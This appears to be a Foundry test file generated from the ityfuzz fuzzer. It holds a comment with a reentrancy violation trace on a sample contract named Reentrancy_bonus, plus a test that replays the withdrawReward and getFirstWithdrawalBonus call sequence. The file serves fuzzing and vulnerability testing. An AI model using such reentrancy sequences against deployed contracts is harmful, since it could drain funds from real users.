// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -t './build/*' -f
/*

😊😊 Found violations!


================ Description ================
[Reentrancy]: Reentrancy on "build/Reentrancy_bonus(0x887db5715868498cff494b5dcc8eda6ce5b7652a)" at slot 44738667577030261529149436480124905112895987359518664279738669893232267626269
================ Trace ================
   │  │  │  [Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   │  │  │  │  ├─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.withdrawReward(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb)
   │  │  │  │  │  ├─[6] [Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb.fallback()
   │  │  │  │  └─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call{value: 577}(0x00000000)
   │  [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   │  │  ├─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.getFirstWithdrawalBonus(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd)
   │  │  │  ├─[4] [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   │  │  │  │  ├─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.getFirstWithdrawalBonus(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd)
   │  │  │  │  │  ├─[6] [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   │  │  │  │  └─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call(0x00000000)
   │  │  └─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call{value: 1718.8835 ether}(0x00000000)


 */

contract Build is Test {
    function setUp() public {
    }

    function test() public {
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).withdrawReward(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).getFirstWithdrawalBonus(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).getFirstWithdrawalBonus(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function withdrawReward(address) external payable;
    function getFirstWithdrawalBonus(address) external payable;
}
